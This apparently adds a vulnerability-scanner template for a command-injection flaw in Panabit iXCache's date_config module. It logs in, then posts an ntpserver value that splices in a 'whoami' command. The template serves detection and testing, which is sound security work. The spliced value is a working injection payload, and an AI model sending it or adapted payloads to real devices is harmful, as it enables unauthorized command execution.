@@ -1,0 +1,44 @@
+id: panabit-ixcache-rce
+brief:
+    title: Panabit iXCache date_config - Remote Code Execution
+    by: momika233
+    level: critical
+    about: Panabit iXCache date_config module has command splicing, resulting in the execution of arbitrary commands.
+    label:
+        - panabit
+        - rce
+        - ixcache
+        - intrusive
+        - iot
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/login/userverify.cgi'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: username={{username}}&password={{password}}
+      signs:
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: POST
+      to:
+        - '{{BaseURL}}/cgi-bin/Maintain/date_config'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: ntpserver=0.0.0.0;whoami&year=2021&month=08&day=14&hour=17&minute=04&second=50&tz=Asiz&bcy=Shanghai&ifname=fxp1
+      signs:
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
